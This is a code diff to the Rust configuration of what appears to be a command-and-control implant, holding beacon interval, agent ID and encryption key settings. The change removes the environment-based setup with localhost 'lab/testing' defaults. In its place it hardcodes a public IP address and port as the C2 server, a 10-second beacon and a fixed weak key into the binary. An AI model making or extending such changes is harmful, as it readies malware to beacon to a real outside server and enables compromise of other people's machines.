@@ -13,31 +13,14 @@ pub struct Config {
 
 impl Config {
     pub fn from_env() -> Result<Self, Box<dyn std::error::Error>> {
-        // Load from .env file if it exists
-        let _ = dotenv::dotenv();
-
-        // Hardcoded values for lab/testing
-        let c2_url = env::var("C2_URL").unwrap_or_else(|_| "127.0.0.1".to_string());
-        let c2_port = env::var("C2_PORT")
-            .unwrap_or_else(|_| "8000".to_string())
-            .parse::<u16>()?;
-
-        let beacon_interval = env::var("BEACON_INTERVAL")
-            .unwrap_or_else(|_| "15".to_string())
-            .parse::<u64>()?;
-
-        let debug = env::var("DEBUG")
-            .unwrap_or_else(|_| "true".to_string())
-            .to_lowercase() == "true";
-
-        // Generate agent ID dynamically
-        let agent_id = env::var("AGENT_ID")
-            .unwrap_or_else(|_| uuid::Uuid::new_v4().to_string());
-
-        // Default encryption key for lab
-        let key_str = env::var("ENCRYPTION_KEY")
-            .unwrap_or_else(|_| "0000000000000000000000000000000000000000000000000000000000000042".to_string());
-        let encryption_key = Self::parse_key(&key_str)?;
+        // All config hardcoded in binary - no .env file needed
+        let c2_url = "191.217.250.6".to_string();
+        let c2_port: u16 = 8765;
+        let beacon_interval: u64 = 10;
+        let debug = true;
+        let agent_id = uuid::Uuid::new_v4().to_string();
+        let key_str = "0000000000000000000000000000000000000000000000000000000000000042";
+        let encryption_key = Self::parse_key(key_str)?;
 
         Ok(Self {
             c2_url,
